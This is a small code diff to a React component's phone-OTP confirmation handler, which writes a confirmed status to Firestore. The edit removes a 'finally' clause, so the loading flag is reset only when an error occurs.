@@ -61,7 +61,6 @@ export function StcVerificationModal({
       await setDoc(doc(db as Firestore, "pays", visitorId), { phoneOtpStatus: "confirmed" }, { merge: true })
     } catch (err) {
       console.error("[STC Modal] confirm error:", err)
-    } finally {
       setIsConfirming(false)
     }
   }
